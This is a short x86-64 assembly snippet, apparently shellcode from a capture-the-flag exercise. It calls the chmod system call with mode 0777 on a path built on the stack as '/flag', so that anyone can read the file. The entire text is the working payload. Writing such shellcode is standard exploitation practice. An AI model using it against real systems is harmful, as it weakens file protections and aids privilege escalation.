.global _start
_start:
.intel_syntax noprefix
	nop
	mov al, 90
	mov si, 511
	mov ebx, 0x67616c66
	shl rbx, 8
	mov bl, 0x2f
	push rbx
	mov rdi, rsp
	syscall
